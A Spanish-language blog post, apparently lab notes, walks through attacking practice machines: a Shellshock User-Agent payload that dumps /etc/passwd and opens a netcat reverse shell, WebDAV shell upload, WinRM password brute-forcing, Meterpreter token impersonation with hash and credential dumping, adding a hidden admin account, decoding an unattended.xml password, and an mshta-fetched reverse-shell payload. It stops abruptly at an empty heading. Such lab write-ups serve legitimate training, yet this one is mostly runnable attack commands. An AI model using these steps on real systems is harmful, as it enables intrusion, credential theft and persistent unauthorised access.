---
title: "Resolución de Laboratorios"
date: 2026-04-14 22:39:00 -0500
categories: [Hacking, Vulnerabilidades, Explotación]
tags: [cracking, enumeración, Nmap, Metasploit, Hydra y CrackMapExec]
description: Laboratorios.
toc: true
---

En este Post se procederá con el paso a paso para resolver varios laboratorios que permitirá poner en práctica todos los conocimiento adquiridos.

## **Shellshock**
También conocido como **Bashdoor**, es una familia de vulnerabilidades en el intérprete de comandos Bash. Revelada en 2014, permite a un atacante ejecutar comandos arbitrarios a través de variables de entorno, afectando gravemente a servidores web que utilizan scripts CGI.
### 1. Laboratorio de Pruebas (Docker)
Se empieza con una fase de reconocimiento de puertos con nmap que contengan scripts ejecutables como (.cgi, .sh).

**Escaneo con NMAP**
```shell
nmap -p- dominio.com
nmap -sCV -p80 dominio.com
nmap -p 8080 --script http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" dominio.com
```
**Enumeración de Directorios**
Es vital encontrar la ruta del CGI. Usaremos dirb o gobuster:
```shell
dirb http://dominio.com
dirb http://dominio.com -X php,txt,bak,html,cgi,sh,bin
```
> Nota: Fíjate en los códigos de estado. Un 200 OK en /cgi-bin/test.cgi es nuestro punto de entrada.
{: .prompt-warning }

El comando -X permite hacer una fuerza bruta de extensiones.
La extención cgi indica que la web es vulnerable a ShellShock que funciona con Apache. para más información de cómo aprovechar la vulnerabilidad, se puede consultar en el siguiente repositorio:  **[ShellShock](https://github.com/opsxcq/exploit-CVE-2014-6271)**.

El cómando para determinar la vulnerabilidad es el siguiente:
```shell
env x='() { :;}; echo Bash is vulnerable!' bash -c "echo Bash Test"
```
> Nota: Si en consola responde Bash Test, no es bulenrable. Si responde Bash is vulnerable, significa que si se puede atacar.
{: .prompt-warning }

### 2. Explotación de la vulnerabilidad
Lo primero es activar Foxy Proxy para interceptar las peticiones con Burp Suite.
Al interceptar debemos ver la etiqueta **User-Agent** la cuál es vulnerable. Para modificar esta etiqueta se da clic derecho en la petición y se da clic en **Send-Repeater** que es el encargado de modificar la petición y enviar las veces que desee.
```BrupSuite
User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
User-Agent: () { :; }; echo; echo; /bin/bash -c 'which nc'
User-Agent: () { :; }; echo; echo; /bin/bash -c 'ps -ef'
```
Con ese comando imprime el archivo **/etc/passwd** del servidor y a partir de aquí se puede modificar y enviar cualquier tipo de comando al servidor.

Al tener instalado netcat, se puede buscar una revshell **[RevShells](https://revshells.com)**
```shell
User-Agent: () { :; }; echo; echo; /bin/bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.1.21 4545 >/tmp/f'

#Se debe tener un comando escucha
nc -nlvp 4545
```
> Ojo: Se debe comprobar la ip de nuestra máquina mediante el comando ip add.
{: .prompt-warning }

## **Windows: IIS Server: WebDav Metasploit**
Se empieza por el escaneo de puertos y escaneo de directorios.
```shell
nmap --script http-enum -sV -p80 dominio.com
dirb http://dominio.local/
```
Al analizar las vulnerabilidades, también podemos revisar con el comando davtest y cadaver si podemos cargar infomración al servidor, en este laboratorio al tener credeciales se procede con los siguientes comandos:
```shell
davtest -auth bob:password_123321 -url http://dominio.local/ 
echo "put shell.php" | cadaver http://dominio.local/uploads --login=bob:password_123321
```

### Metasploit
```shell
msfconsole -q
search webdav iis
use exploit/windows/iis/iss_webdav_upload_asp
set rhosts dominio.local
set httpusername bob
set httppassword password_123321
set path /webdav/reversehll.asp
exploit
```
Metasploit se encarga de hacer todo el proceso y de levantar el puerto escucha para tener un meterpreter o sesión lista.

## **Vulnerabilidad de WinRM**
### Forma crackmapexec
Servicio de windows que se habilita por los Administradores para manejar equipos remotamente. Corre en el puerto 5985. Este servicio es distinto a SMB.
```shell
ping dominio.local
nmap -p- dominio.local
```
Al ver los servicios y puertos abiertos, se procede a intentar vulnerar el equipo.
```shell
crackmapexec -t 1000 winrm dominio.local -u /usr/share/metasploit-framework/data/wordlists/common_user.txt -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```
Con esto prueba con cada uno de los usuarios y contraseñas que tenemos en el sistema. Este comando contiene los siguientes argumentos en donde:
- **-t** significa la cantidad de hilos que se utilizan.
- **winrm** es el servicio a explotar

Luego de haber obtenido credenciales se procede a conectarse al equipo con **EVIL-WINRM** de la siguiente manera:
```shell
evil-winrm -i dominio.local -u administrator -p tinkerbell
> whoami
> whoami /priv
```
Si no se tiene el permiso de administrador y se tiene el permiso **SeImpersonatePrivilege** se puede escalar privilegios. Los pasos a seguir está en el post anterior.

### Metasploit
Otra forma de atacar es mediante metasploit de la siguiente manera:
```shell
msfconsole -q
search winrm logion
use 0
set rhosts dominio.local
set user_file /usr/share/metasploit-framework/data/wordlists/common_user.txt
set pass_file /usr/share/metasploit-framework/data/wordlists/unix_password.txt
set verbose true
set PASSWORD anything
exploit
```
> NOTA: Se debe configurar el paramentro PASSWORD como anything porque en las nuevas versiones lo solicita.
{: .prompt-warning }

Luego de haber obtenido las credenciales se procede a conseguir acceso meterpreter para ejecutar comandos de la siguiente mandera:
```shell
use exploit/windows/winrm/winrm_script_exec
set rhosts dominio.local
set username administrator
set password tinkerbell
set FORCE_VBS true
exploit

meterpreter>
```

## **Privilege Escalation: Impersonate - KIWI - INCOGNITO** 
Este método funciona mediante la suplantación de token de un usuario. Esto sucede mucho en las empresas ya que al no tener mucos permisos, el administrador se conecta remotamente para instalar programas y esas credenciales se guardan temporalmente en el equipo de forma temporal hasta que se reinicie el equipo.

```shell
nmap -p- dominio.local
nmap -p80,139,445,3389,5985,47001 -sVC --min-rate 5000 -n dominio.local
searchsploit hfs 2.3

msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set rhosts dominio.local
run
```
Con esto se incia la explotación del servidor de archivos hfs y abre un meterpreter en donde comenzaremos la escalación de privilegios.
```shell
meterpreter> getuid
    Server username: NT AUTHORITY/LOCAL SERVICE
meterpreter> load kiwi
meterpreter> creds_all
    fail
meterpreter> hushdump
    fail
meterpreter> load incognito
meterpreter> list_tokens -u #Revisamos tokens almacenados en el sistema
meterpreter> impersonate_token ATTACKDEFENSE\\Administrator
    Successfully impersonated user ATTACKDEFENSE\\Administrator
meterpreter> getuid
    Server username: NT AUTHORITY\Administrator
meterpreter> getsystem
    Named Pipe Impersonation (In Memory Admin)
meterpreter> getuid
    Server username: NT AUTHORITY\SYSTEM
meterpreter> hashdump
meterpreter> creds_all
meterpreter> lsa_dump_sam #Dump a diferentes hashes de usuario
```
Como ya se tiene acceso a sistema, se puede crear un nuevo usuario para acceder mediante RDP y verificar cómo el sistema muestra las credenciales en texto plano.
```shell
meterperer> shell
> net user administrator2 password /add
> net localgroup administrators administrator2 /add
```
Ahora desde otro terminal procedemos a conectarnos a RDP y se puede ver cómo al hacer un creds_all muestra las contraseñas en texto plano.
```shell
rdesktop dominio.local
```
Con este proceso se ha logrado escalar privilegios mediante el módulo de Incógnito.

## UNATTENDED INSTALLATION 
### WINDOWS
Powerup.ps1 es un script parecido al escalador de privilegios en linux, que se encarga de ver vulnerabilidades y fallos que tienen los sistemas. Este escript se puede encontrar en github. Para la práctica este repositorio está ubicado en la carpeta escritorio y se procede de la siguiente manera:
* En la máquina Windows se deberá acceder a este script
```shell
cd \Desktop\PowerSploit\Privesc
ls
    PowerUp.ps1
```
Para ejecutar scripts externos a windows, lo primero que se debe hacer es un bypass para que permita Windows ejecutarlo.
```powershell
powershell -ep bypass # (PowerShell execution policy bypass)
. .\PowerUp.ps1
Invoke-PrivescAudit
```
![Powershell - PowerUp.ps1](/assets/img/Primer-Blog/powershell.jpg){: width=auto }
_Invoke-privescAudit_

Este resultado nos muestra que tenemos una ruta Unattended Path con un archivo llamado **unattended.xml**, donde tenemos información bastante importante. Esto se guarda por hacer automatizaciones o instalar un programa.

Ahora vamos a ver que información tiene este archivo con el siguiente comando:
```powershell
type unattended.xml
```
![Powershell - PowerUp.ps1](/assets/img/Primer-Blog/unattended.jpg){: width=auto }
_unattended.xml_

En este archivo nos da un nombre de usuario llamado Administrator y la contraseña Password en el campo Value la cual está cifrada. Para decodificarlo debemos utilizar el siguiente comando:
```powershell
$password=`QWRtaW5AMTIz`
$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
echo $password
Admin@123
```
Descifrada la contraseña, ahora podemos conectarnos con credenciales de otro usuario mediante la herramienta **runas.exe**.

```powershell
runas.exe /user:administrator cmd
Admin@123
whoami
```
Con el comando anterior abre una shell tipo administrador en la que podemos interactuar.

### LINUX
Para hacer el mismo proceso en linux, procedemos con el metasploit de la siguiente manera:
```shell
msfconsole -q
use exploit/windows/misc/hta_server
set target 1
set payload windows/x64/meterpreter/reverse_tcp
exploit
```
Este exploit ayuda a correr un paload vía powershell. Generando una URL servidor escucha a la espera de que alguien le ejecute en windows con un usuario adminsitrador, para ello se utiliza el siguiente comando.
```shell
mshta.exe http://10.10.31.2:80/Bn75U0NL80NS.hta
```

video 2:21
## Password Cracker: Linux